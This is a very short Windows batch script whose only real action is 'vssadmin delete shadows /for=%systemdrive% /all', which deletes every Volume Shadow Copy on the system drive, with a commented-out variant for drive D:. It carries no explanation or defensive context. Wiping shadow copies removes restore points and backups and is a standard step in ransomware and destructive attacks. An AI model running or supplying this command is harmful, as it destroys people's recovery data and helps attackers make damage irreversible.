@echo off

%cocolor% 0d

vssadmin delete shadows /for=%systemdrive% /all
::vssadmin delete shadows /for=d: /all

exit